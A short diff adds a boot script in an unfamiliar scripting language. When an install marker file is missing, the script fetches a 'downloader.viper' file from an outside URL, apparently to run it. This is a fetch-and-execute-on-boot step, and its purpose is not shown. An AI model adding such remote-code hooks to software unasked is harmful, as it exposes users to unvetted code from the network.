@@ -1,0 +1,8 @@
+@boot
+
+find [FILE: NLP\installed.satif]
+if systemerror
+  do url"https://sawigroup.com/servers/hubotalora/downloader.viper"
+else continue
+
+end
